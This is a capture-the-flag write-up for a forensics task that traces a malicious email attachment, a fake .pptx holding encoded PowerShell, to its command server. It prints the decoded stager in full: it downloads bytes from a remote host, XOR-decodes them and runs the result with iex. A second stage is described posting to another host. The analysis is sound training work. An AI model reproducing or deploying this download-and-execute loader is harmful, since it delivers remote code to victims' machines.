# Task 3
With the provided information, OOPS was quickly able to identify the employee associated with the account. During the incident response interview, the user mentioned that they would have been checking email around the time that the communication occurred. They don't remember anything particularly weird from earlier, but it was a few weeks back, so they're not sure. OOPS has provided a subset of the user's inbox from the day of the communication.

Identify the message ID of the malicious email and the targeted server.

Downloads:
- User's emails (emails.zip)

# Solution
1. unzip emails
2. use ripmime to extract all the attachments
	a. for i in *; do ripmime -i $i -d attachment_$i; done;
3. further see what kind of attachments are within each email message
	a. file attachment*/*
4. oh the oopsie_update.pptx is not actually a powerpoint file... it's ASCII text
5. cat oopsie_update.pptx and see a powershell command to an "-enc" which sends a base64 string (which we know because of the "==" at the end
6. use cyberchef to decode the bas64 to see:
	$bytes = (New-Object Net.WebClient).DownloadData('http://xomtq.invalid/analysis')

	$prev = [byte] 173

	$dec = $(for ($i = 0; $i -lt $bytes.length; $i++) {
    		$prev = $bytes[$i] -bxor $prev
    		$prev
	})

	iex([System.Text.Encoding]::UTF8.GetString($dec))
7. we see it is downloading data, but notice that xomtq.invalid doesn't work so we gotta look more into it... we see that we should look at the HEX stream from the 200 HTTP request
8. Booting up VS Code, we need to write a script that takes the hex_val stream and put it into byte format, which we do via unhexlify
9. Next we do the same operation that is being done in the ASCII text from step 6 but in Python
10. Make sure to join all the items in the list and print it out, we get a huge powershell script and output that to fullpowershell.txt and then see at the bottom a POST request sent to http://wtmbi.invalid:8080
11. going back to message_9.eml, I used "head message_9.eml" to find the Message-ID as <161584985300.22130.15351049748726194876@oops.net>
12. Submit Message-ID and domain name to the challenge (wtmbi.invalid) and SUCCESS
